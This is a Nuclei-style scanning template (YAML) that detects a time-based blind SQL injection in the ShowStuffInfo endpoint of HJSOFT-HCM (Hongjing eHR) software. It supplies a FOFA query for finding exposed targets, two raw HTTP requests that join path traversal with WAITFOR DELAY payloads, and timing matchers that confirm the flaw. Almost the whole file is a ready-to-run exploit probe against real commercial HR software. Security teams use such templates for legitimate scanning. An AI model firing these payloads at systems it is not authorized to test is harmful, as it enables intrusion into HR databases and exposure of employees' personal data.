id: hongjing-ehr-showstuffinfo-sqli
info:
  name: HJSOFT-HCM ShowStuffInfo 接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="HJSOFT-HCM"
      技术验证：目标系统在ShowStuffInfo接口处理过程中未正确过滤SQL特殊字符，攻击者可通过构造恶意输入参数实现数据库查询操控，导致敏感数据泄露或执行任意命令。该缺陷影响HJSOFT-HCM企业人力资源管理系统的核心数据交互模块。
  tags: 宏景eHR
http:
- raw:
  - |
    GET /templates/attestation/../../jp_contest/personinfo/ShowStuffInfo?id=1';WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  - |
    GET /templates/attestation/../../jp_contest/personinfo/ShowStuffInfo?id=1';WAITFOR+DELAY+'0:0:8'--+ HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
